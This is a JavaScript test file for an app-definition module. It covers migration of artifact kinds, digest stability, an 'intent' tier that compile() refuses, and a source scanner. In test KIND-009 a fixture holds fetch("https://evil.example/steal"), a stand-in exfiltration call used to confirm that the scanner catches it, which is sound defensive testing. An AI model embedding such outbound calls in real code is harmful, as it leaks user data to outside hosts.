import test from 'node:test';
import assert from 'node:assert/strict';
import { compile, definition, sourceIssues, effectiveKind, KINDS } from '../demo/definition.js';

// Artifact-kind migration (dual-accept, absent-means-classic) and the `tier:'intent'` state
// that makes "no source yet" a real, compile()-refusing definition instead of a silent
// fallback to a template. See docs/implementation-status.md's artifact-types section.

const legacyTemplate = { title: 'Legacy App', brief: 'A pre-existing app record.', template: 'claims', accent: 'teal', tier: 'template' };
const legacyStatic = { title: 'Legacy Static', brief: 'A pre-existing static app.', template: 'knowledge', accent: 'teal', tier: 'static', source: { 'index.html': '<h1>hi</h1>' } };

test('KIND-001 a legacy template-tier record with no kind field validates exactly as before', () => {
  const config = definition(legacyTemplate);
  assert.equal(config.template, 'claims');
  assert.equal('kind' in config, false);
  assert.equal(effectiveKind(config), 'classic');
});

test('KIND-002 a legacy record\'s sourceDigest is byte-identical to before `kind` existed (proven against the pre-change digest, not just internally consistent)', () => {
  // These exact digests were captured with `git stash` against the commit immediately before
  // this change landed -- see the commit message for how. If this test ever needs updating,
  // that is the signal something broke digest stability, not a signal to just accept new values.
  assert.equal(compile(legacyTemplate).sourceDigest, '0b67d608352c765bac86539f3aefaad468fbf5bab758c08532f44ade5cccd860');
  assert.equal(compile(legacyStatic).sourceDigest, 'a918e06633851f13b0d1c209afeef85919f5abdd98a153bd835e3e9fc1523c91');
});

test('KIND-003 a new-style record supplies kind and never requires template', () => {
  const config = definition({ title: 'New App', brief: 'A kind-based artifact.', kind: 'interactive', accent: 'teal', tier: 'intent' });
  assert.equal(config.kind, 'interactive');
  assert.equal(config.template, undefined);
  assert.equal(effectiveKind(config), 'interactive');
});

test('KIND-004 an invalid kind is rejected, listing the real options (not exposing "classic", which is MCP-only)', () => {
  assert.throws(() => definition({ title: 'Bad Kind', brief: 'test test test', kind: 'nonsense', accent: 'teal', tier: 'intent' }),
    /kind must be one of: interactive, knowledge, application, auto/);
});

test('KIND-005 tier "intent" requires a kind — a legacy template-only record cannot use it', () => {
  assert.throws(() => definition({ title: 'No Kind Intent', brief: 'test test test', template: 'claims', accent: 'teal', tier: 'intent' }),
    /tier "intent" requires kind/);
});

test('KIND-006 tier "intent" is a valid definition that compile() explicitly refuses — never a silent template', () => {
  const config = definition({ title: 'Ungenerated', brief: 'test test test', kind: 'interactive', accent: 'teal', tier: 'intent' });
  assert.equal(config.tier, 'intent'); // constructing the definition itself must succeed
  assert.throws(() => compile(config), /has not been generated yet/);
});

test('KIND-007 all four user-facing kinds plus classic are exposed', () => {
  assert.deepEqual(KINDS, ['interactive', 'knowledge', 'application', 'auto', 'classic']);
});

test('KIND-008 sourceIssues no longer false-flags a standard SVG namespace declaration', () => {
  const source = { 'index.html': '<img src="logo.svg">', 'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"></svg>' };
  assert.deepEqual(sourceIssues(source), []);
});

test('KIND-009 sourceIssues still catches a genuine external reference alongside the network APIs', () => {
  const source = { 'index.html': '<h1>hi</h1>', 'app.js': 'fetch("https://evil.example/steal")' };
  const issues = sourceIssues(source);
  assert.ok(issues.includes('outbound fetch()'));
  assert.ok(issues.some(i => i.includes('external')));
});

test('KIND-010 sourceIssues never throws — always returns an array, even for a completely malformed source', () => {
  assert.deepEqual(sourceIssues(null), sourceIssues(null)); // doesn't throw
  assert.ok(Array.isArray(sourceIssues({})));
  assert.ok(sourceIssues({}).length > 0);
});
